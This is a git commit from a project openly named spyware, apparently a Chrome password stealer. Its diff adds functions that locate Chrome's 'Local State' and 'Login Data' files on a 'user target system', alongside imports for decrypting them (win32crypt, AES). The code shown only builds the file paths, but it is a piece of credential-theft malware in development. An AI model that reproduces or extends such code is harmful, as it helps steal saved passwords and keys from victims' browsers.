bd43fa1cdef6f5c233e02bf1dcb5a422639e6ec6
Hjt <ronaldohjt2@gmail.com>
2024-04-01 14:21:34 +0330

    feat(export_data)
    Implemented get_local_state() which can find Local State file in user target system.
    Implemented get_login_data() which can find Login Data file in user target system

--- Spyware/PasswordExporter/exporter.py
+++ Spyware/PasswordExporter/exporter.py
@@ -5,3 +5,7 @@ import sqlite3
 import shutil
 import win32crypt
 from Cryptodome.Cipher import AES
+def get_local_state() -> str:
+    return os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data\Local State'
+def get_login_data() -> str:
+    return os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
